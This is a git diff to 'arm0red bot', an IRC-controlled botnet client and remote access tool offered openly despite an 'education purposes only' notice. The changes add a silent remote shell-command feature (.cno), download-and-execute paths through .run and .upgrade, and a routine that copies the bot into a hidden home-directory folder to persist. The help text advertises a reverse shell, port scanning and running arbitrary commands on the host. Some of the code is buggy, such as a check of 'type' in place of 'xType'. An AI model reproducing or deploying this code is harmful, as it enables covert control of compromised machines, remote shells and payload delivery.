@@ -3,7 +3,7 @@
 # arm0red bot
 # bot.py
 #
-# Copyright (c) 2018 Stephen Harris <trackmastersteve@gmail.com>
+# Copyright (c) 2018-2019 Stephen Harris <trackmastersteve@gmail.com>
 #
 # Permission is hereby granted, free of charge, to any person obtaining a copy
 # of this software and associated documentation files (the "Software"), to deal
@@ -27,8 +27,8 @@ legal_notice = 'THIS BOT IS FOR EDUCATION PURPOSES ONLY! DO NOT USE IT FOR MALIC
 author = 'Stephen Harris (trackmastersteve@gmail.com)'
 github = 'https://github.com/trackmastersteve/bot.git'
 software = 'arm0red bot'
-version = '0.9.5'
-last_modification = '2018.10.17'
+version = '0.9.8'
+last_modification = '2019.08.29'
 
 # Imports
 import os
@@ -37,17 +37,18 @@ import sys
 import nmap
 import time
 import uuid
+import shlex
 import base64
 import random
 import socket
-import ipgetter
 import datetime
 import platform
 import threading
 import subprocess
 import urllib.request
+from requests import get
 starttime = datetime.datetime.utcnow() # Start time is used to calculate uptime.
-ip = ipgetter.myip() # Get public IP address. (used to set botnick-to-ip as well as the '.ip' command.)
+ip = get('https://api.ipify.org').text # Get public IP address. (used to set botnick-to-ip as well as the '.ip' command.)
 
 #################################################
 ############# Booleans ##########################
@@ -64,7 +65,7 @@ serverpass = "password" # Password for IRC Server. (UnrealIRCD uses this as defa
 channel = "#arm0red" # Channel to join on connect.
 #botnick = "botnick" # Your bots IRC nick.
 #botnick = "ip" + ip.replace(".", "_") # Set bots nick to IP address, but in proper IRC nick compatible format.
-botnick = "abot" + str(random.randint(10000,99999)) # Set bots IRC Nick to abot + 5 random numbers.
+botnick = "abot["+ str(random.randint(10000,99999)) +"]" # Set bots IRC Nick to abot + 5 random numbers.
 nspass = "password" # Bots NickServ password.
 nickserv = "NickServ" # Nickname service name. (sometimes it's differnet on some networks.)
 adminname = "arm0red" # Bot Master's IRC nick.
@@ -170,7 +171,6 @@ def sendntc(ntc, target=channel): # Sends a NOTICE to the target.
 def sendversion(nick, ver): # Respond to VERSION request.
     ver = "VERSION " + software + ' ' + version + ' Download it at: ' + github
     sendntc(ver, nick)
-    #ircsend("NOTICE "+ nick +" :VERSION " + ver)
     
 def kick(msg, usr, chan): # Kick a user from the channel.
     ircsend("KICK "+ chan + " " + usr + " :"+ msg)
@@ -243,10 +243,28 @@ def rShell(rsHost, rsPort):
     rs.close()
     
 def runcmd(sc):
-    proc = subprocess.Popen(sc, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-    stdout_value = proc.stdout.read() + proc.stderr.read()
-    sendntc(format(stdout_value), adminname)
+    proc = subprocess.Popen(shlex.split(sc), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+    while True:
+        line = proc.stdout.readline()
+        line_str = str(line, "UTF-8")
+        if line == b'' and proc.poll() is not None:
+            if debugmode:
+                print("End of .cmd output.")
+            sendntc("Shell>", adminname)
+            return
+        if line:
+            if debugmode:
+                print(format(line_str))
+            sendntc("Shell> " + format(line_str), adminname)
+    pp = proc.poll()
+    if debugmode:
+        print(pp)
+    sendntc(pp, adminname)
+    sendntc("Shell> Done.", adminname)
     
+def runcmd_noout(sc):
+    proc = subprocess.Popen(sc, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+
 def setmode(flag, target=channel): # Sets given mode to nick or channel.
     ircsend("MODE "+ target +" "+ flag)
     
@@ -254,14 +272,17 @@ def download(link, file):
     urllib.request.urlretrieve(str(link), str(file))
     sendntc(str(file) +" was successfully downloaded from "+ str(link) +"!", adminname)
 
-def execute(file):
-    #exec(open(str(file)).read())
-    #os.system(str(file))
-    runcmd(file)
+def execute(xType, file):
+    if xType == 'ex':
+        exec(open(str(file)).read())
+    if type == 'sys':
+        os.system(str(file))
+    else:
+        runcmd_noout('./'+ file)
     
-def update():
-    download('https://arm0.red/bot.py', 'bot-latest.py')
-    runcmd('./bot-latest.py')
+def update(link, file):
+    download(link, file)
+    runcmd_noout('./' + file)
     sys.exit()
 
 def retrieveFile(fsname, fs, fsaddr):
@@ -298,6 +319,46 @@ def fileServer():
         t.start()
     s.close()
 
+def srtChk():
+    script = sys.argv
+    name = str(script[0])
+    hd = str(os.path.expanduser('~'))
+    hdPath = hd + '/.arm0red'
+    clone = hdPath + '/bot.py'
+    if name == clone:
+        if debugmode:
+            print(name + " and "+ clone + " are the same file!")
+            connect()
+            #print("Cloned bot is already running!")
+    else:
+        try:
+            if debugmode:
+                print("NAME: " + name)
+                print("CLONE: " + clone)
+                print("HOME DIR: " + hd)
+            if os.path.isdir(hdPath) and os.path.exists(hdPath):
+                if debugmode:
+                    print("Directory Exists: " + hdPath)
+            else:
+                if debugmode:
+                    print("Creating Directory: " + hdPath)
+                os.mkdir(hdPath)#, 0700)
+            if os.path.isfile(clone):
+                if debugmode:
+                    print("Bot File Exists: " + clone)
+            else:
+                if name != clone:
+                    if debugmode:
+                        print("Copying " + name + " to: " + clone)
+                    os.system("cp " + name + " " + clone)
+            if debugmode:
+                print("Running: " + clone)
+                runcmd(clone)
+                #os.system(clone)
+        except OSError as mdr:
+            if debugmode:
+                print("ERROR: " + str(mdr))
+
 def main():
     global connected
     global botnick
@@ -308,7 +369,6 @@ def main():
         ircmsg = ircmsg.strip('\n\r')
         if debugmode: # If debugmode is True, msgs will print to screen.
             print(ircmsg) # Print messages to the screen. (won't allow bot to run in the background.)
-            #sendmsg(ircmsg, adminname) # Sends messages to the channel/admin. (Will run in background. But spams admin.)
         
         # SASL Authentication.
         if ircmsg.find("ACK :sasl") != -1:
@@ -347,14 +407,13 @@ def main():
             name = ircmsg.split('!',1)[0][1:]
             message = ircmsg.split('NOTICE',1)[1].split(':',1)[1]
             if message.find('*** You are connected') != -1:
-                sendmsg("IDENTIFY %s" % nspass, nickserv)
+                #sendmsg("IDENTIFY %s" % nspass, nickserv)
                 joinchan(channel)
                 sendntc(format(ip) + " Online!", adminname)
                 
             # Respond to NickServ ident request.
             if name.lower() == nickserv.lower() and message.find('This nickname is registered') != -1:
                 sendmsg("IDENTIFY " + nspass, nickserv)
-                #sendntc("IDENTIFIED: " + nspass, adminname)
                 
         # Respond to CTCP VERSION
         if ircmsg.find('VERSION') != -1:
@@ -432,14 +491,16 @@ def main():
                         message = "Could not parse. The message should be in the format of '.dl [url] [file]' to work properly."
                     sendntc(message, adminname)
                                
-                # Respond to the '.run [executable file]' command from admin.
+                # Respond to the '.run [execute type] [executable file]' command from admin.
                 if name.lower() == adminname.lower() and message[:5].find('.run') != -1:
-                    if message.split(' ', 1)[1] != -1:
+                    target = message.split(' ', 1)[1]
+                    if target.find(' ') != -1:
                         exec_file = message.split(' ', 1)[1]
-                        message = "Running the executable file: " + exec_file
-                        execute(exec_file)
+                        exec_type = message.split(' ')[0]
+                        message = "Running the executable file: " + exec_file + " Using: " + exec_type
+                        execute(exec_type, exec_file)
                     else:
-                        message = "Could not parse. The message should be in the format of '.run [executable file]' to work properly."
+                        message = "Could not parse. The message should be in the format of '.run [exec type] [exec file]' to work properly."
                     sendntc(message, adminname)
                 
                 # Respond to the '.raw [command]' command from admin.
@@ -509,6 +570,7 @@ def main():
                                   '.rsh [target] [port]' (opens reverse shell to target),
                                   ....listener can be downloaded at https://github.com/trackmastersteve/shell.git,
                                   '.cmd [shell command]' (run shell commands on the host),
+                                  '.cno [shell command]' (run shell commands without output),
                                   '.fsdl' (run fileserver to download files from),
                                   '.scan [ip] [comma seperated ports]' (nmap port scanner),
                                   '.msg [target] [message]' (sends a msg to a user/channel),
@@ -519,9 +581,9 @@ def main():
                                   '.kick [channel] [nick] [reason]' (tells bot to kick a user from a channel),
                                   '.mode [target] [mode]' (set mode on nick or channel),
                                   '.nick [newnick]' (sets a new botnick),
-                                  '.raw [command]' (sends a raw command to the server),
+                                  '.raw [command]' (sends a raw command to the IRC server),
                                   '.dl [url] [file] (downloads [url] and saves as [file]),
-                                  '.run [executable file]' (execute a file),
+                                  '.run [execute type] [executable file]' (execute a file),
                                   '.upgrade [link] file]' (upgrades the bot.py file),
                                   'Hi [botnick]' (responds to any user saying hello to it),
                                   'bye [botnick]' (tells bot to quit)
@@ -538,7 +600,7 @@ def main():
                 
                 # Respond to '.ip' command from admin.
                 if name.lower() == adminname.lower() and message.find('.ip') != -1:
-                    ip = ipgetter.myip()
+                    ip = get('https://api.ipify.org').text
                     sendntc("My public ip address is: " + format(ip), name)
                 
                 # Respond to '.uptime' command from admin.
@@ -643,7 +705,20 @@ def main():
                     else:
                         sendntc("Shell commands are disabled!", adminname)
                 
-                # Respond to 'exitcode botnick' from admin.
+                 # Respond to '.cno [shell command]' command from admin.
+                if name.lower() == adminname.lower() and message[:5].find('.cno') != -1:
+                    if enableshell:
+                        if message.split(' ', 1)[1] != -1:
+                            shellcmd = message.split(' ', 1)[1]
+                            message = "Shell> " + shellcmd
+                            runcmd_noout(shellcmd)
+                        else:
+                            message = "Could not parse. The command should be in the format of '.cno [shell command]' to work properly."
+                        sendntc(message, adminname)
+                    else:
+                        sendntc("Shell commands are disabled!", adminname)
+                
+               # Respond to 'exitcode botnick' from admin.
                 if name.lower() == adminname.lower() and message.rstrip() == exitcode + " " + botnick:
                     sendmsg("Okay, Bye!")
                     ircsend("QUIT Killed by " + adminname)
@@ -668,6 +743,7 @@ def main():
                 
 try: # Here is where we actually start the Bot.
     if not connected:
+        #srtChk() # Check if file exists.
         connect() # Connect to server.
     
 except KeyboardInterrupt: # Kill Bot from CLI using CTRL+C
